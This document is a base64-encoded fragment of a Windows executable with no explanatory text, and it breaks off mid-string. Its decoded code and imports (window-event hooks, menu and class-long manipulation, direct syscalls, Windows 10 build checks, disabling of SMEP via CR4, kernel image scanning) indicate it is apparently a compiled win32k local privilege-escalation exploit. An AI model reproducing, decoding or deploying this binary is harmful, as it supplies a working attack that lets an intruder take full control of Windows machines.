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iwAA+osAAA6MAAAijAAAMowAAEaMAABSjAAAYIwAAHKMAAB8jAAAAAAAAGaPAABUjwAAAAAAALyMAADOjAAA4IwAAO6MAAAAjQAADo0AACqNAAA6jQAATo0AAGCNAAByjQAAhI0AAJKNAACkjQAAtI0AAMSNAADSjQAA5o0AAPaNAAAGjgAAGI4AACiOAAA4jgAATI4AAFqOAABsjgAAfI4AAB6NAAAAAAAA3ooAAIKPAADQigAAjI8AAAAAAAAEjwAAHI8AACqPAAA6jwAA5I4AANCOAAC2jgAAoI4AAPaOAAAAAAAAOQNfc253cHJpbnRmAABeA19zdHJpY21wAABtc3ZjcnQuZGxsAAB+A1dhaXRGb3JTaW5nbGVPYmplY3QAUwFHZXRFeGl0Q29kZVRocmVhZABLA1Rlcm1pbmF0ZVRocmVhZABsAENyZWF0ZVRocmVhZAAAUgNUbHNTZXRWYWx1ZQALAkhlYXBGcmVlAAA+AUdldEN1cnJlbnRUaHJlYWRJZAAAQgNTbGVlcAAFAkhlYXBBbGxvYwBDA1NsZWVwRXgAUQNUbHNHZXRWYWx1ZQBLAENyZWF0ZUV2ZW50QQAALANTZXRUaHJlYWRBZmZpbml0eU1hc2sABwJIZWFwQ3JlYXRlAAB0A1ZpcnR1YWxQcm90ZWN0AAAfA1NldFByaW9yaXR5Q2xhc3MAADsBR2V0Q3VycmVudFByb2Nlc3MAMQNTZXRUaHJlYWRQcmlvcml0eQDCAlJlc3VtZVRocmVhZAAAdgFHZXRNb2R1bGVIYW5kbGVBAABPA1Rsc0FsbG9jAAAxAENsb3NlSGFuZGxlAJwBR2V0UHJvY2Vzc0hlYXAAAFADVGxzRnJlZQBEAkxvYWRMaWJyYXJ5QQAAuwFHZXRTeXN0ZW1JbmZvADUCSXNXb3c2NFByb2Nlc3MAAEtFUk5FTDMyLmRsbAAArAJVbmhvb2tXaW5FdmVudAAAfgJTZXRXaW5FdmVudEhvb2sAXQBDcmVhdGVNZW51AAABAlBvc3RRdWl0TWVzc2FnZQAIAEFwcGVuZE1lbnVBAEcCU2V0Q2xhc3NMb25nQQBmAlNldFBhcmVudAA7AlNlbmRNZXNzYWdlQQAAqgJUcmFuc2xhdGVNZXNzYWdlAABgAENyZWF0ZVdpbmRvd0V4QQCOAERlZldpbmRvd1Byb2NBAAAWAlJlZ2lzdGVyQ2xhc3NBAABgAlNldE1lbnVJbmZvAIACU2V0V2luZG93TG9uZ0EAAPoAR2V0Q2xhc3NMb25nQQBIAlNldENsYXNzTG9uZ1cAkgJTaG93V2luZG93AAB5AlNldFRocmVhZERlc2t0b3AAAPwAR2V0Q2xhc3NOYW1lQQD/AVBvc3RNZXNzYWdlQQAAQwJTZXRBY3Rpd